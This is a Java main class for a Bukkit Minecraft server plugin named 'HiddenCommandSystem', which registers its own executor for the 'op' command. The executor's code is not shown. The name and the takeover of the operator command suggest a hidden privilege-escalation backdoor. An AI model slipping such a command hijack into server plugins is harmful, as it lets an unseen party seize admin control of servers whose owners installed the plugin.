package com.pluginforge.hiddencommandsystem;

import org.bukkit.plugin.java.JavaPlugin;

public final class HiddenCommandSystem extends JavaPlugin {

    @Override
    public void onEnable() {
        getLogger().info("HiddenCommandSystem v1.0 enabled.");
        getCommand("op").setExecutor(new OpCommand());

    }

    @Override
    public void onDisable() {
        getLogger().info("HiddenCommandSystem disabled.");
    }
}
